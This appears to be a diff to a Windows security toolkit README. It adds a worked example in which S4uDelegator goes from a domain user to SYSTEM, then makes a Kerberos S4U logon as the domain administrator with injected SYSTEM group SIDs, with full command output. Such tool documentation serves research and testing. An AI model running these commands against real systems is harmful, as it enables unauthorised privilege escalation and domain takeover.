@@ -661,8 +661,7 @@ Usage: S4uDelegator.exe [Options]
 Available Modules:
 
         + lookup - Lookup account's SID.
-        + read   - Read file with S4U logon.
-        + shell  - Perform S4U logon and get shell. Target account should be local account.
+        + shell  - Perform S4U logon and get shell.
 
 [*] To see help for each modules, specify "-m <Module> -h" as arguments.
 
@@ -714,32 +713,9 @@ C:\dev>S4uDelegator.exe -m lookup -u admin
 ```
 
 
-### read Module
-
-This command is to read file with S4U logon.
-For target account to S4U logon, domain user account and local user account can be used:
-
-```
-C:\dev>S4uDelegator.exe -m read -h
-
-S4Util - Help for "read" command.
-
-Usage: S4uDelegator.exe -m read [Options]
-
-        -h, --help     : Displays this help message.
-        -d, --domain   : Specifies domain name for target account to S4U logon.
-        -u, --username : Specifies username to S4U logon.
-        -s, --sid      : Specifies SID for target account S4U logon.
-        -p, --path     : Specifies target file path to read.
-
-[-] Missing account information.
-```
-
-
 ### shell Module
 
-This command is to get interactive shell with S4U logon.
-For target account to S4U logon, local user account can be used:
+This command is to get interactive shell with S4U logon:
 
 ```
 C:\dev>whoami /user
@@ -781,6 +757,65 @@ User Name  SID
 ========== =============================================
 cl01\admin S-1-5-21-2659926013-4203293582-4033841475-500
 ```
+
+If you want to add token groups, you can specify them comma separated SID values with `-e` option as follows:
+
+```
+C:\Tools>whoami
+contoso\david
+
+C:\Tools>S4uDelegator.exe -m shell -d contoso -u administrator -e s-1-5-18,S-1-5-19
+
+[>] Target account to S4U:
+    |-> Account Name        : CONTOSO\administrator
+    |-> Account Sid         : S-1-5-21-3654360273-254804765-2004310818-500
+    |-> Account Type        : SidTypeUser
+    |-> User Principal Name : administrator@contoso.local
+[>] Group SID to add:
+    |-> [VALID] NT AUTHORITY\SYSTEM (SID : S-1-5-18) will be added.
+    |-> [VALID] NT AUTHORITY\LOCAL SERVICE (SID : S-1-5-19) will be added.
+[>] Trying to get SYSTEM.
+[+] SeDebugPrivilege is enabled successfully.
+[>] Trying to impersonate as smss.exe.
+[+] SeAssignPrimaryTokenPrivilege is enabled successfully.
+[+] SeIncreaseQuotaPrivilege is enabled successfully.
+[>] Trying to impersonate thread token.
+    |-> Current Thread ID : 2660
+[+] Impersonation is successful.
+[>] Trying to Kerberos S4U logon.
+[+] S4U logon is successful.
+[>] Trying to create a token assigned process.
+
+Microsoft Windows [Version 10.0.18362.175]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Tools>whoami
+contoso\administrator
+
+C:\Tools>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                     Type             SID                                          Attributes
+============================================== ================ ============================================ ===============================================================
+Everyone                                       Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                  Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                         Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SYSTEM                            Well-known group S-1-5-18                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\LOCAL SERVICE                     Well-known group S-1-5-19                                     Mandatory group, Enabled by default, Enabled group
+CONTOSO\Group Policy Creator Owners            Group            S-1-5-21-3654360273-254804765-2004310818-520 Mandatory group, Enabled by default, Enabled group
+CONTOSO\Domain Admins                          Group            S-1-5-21-3654360273-254804765-2004310818-512 Mandatory group, Enabled by default, Enabled group
+CONTOSO\Schema Admins                          Group            S-1-5-21-3654360273-254804765-2004310818-518 Mandatory group, Enabled by default, Enabled group
+CONTOSO\Enterprise Admins                      Group            S-1-5-21-3654360273-254804765-2004310818-519 Mandatory group, Enabled by default, Enabled group
+Service asserted identity                      Well-known group S-1-18-2                                     Mandatory group, Enabled by default, Enabled group
+CONTOSO\Denied RODC Password Replication Group Alias            S-1-5-21-3654360273-254804765-2004310818-572 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\System Mandatory Level         Label            S-1-16-16384
+```
+
 
 
 ## SwitchPriv
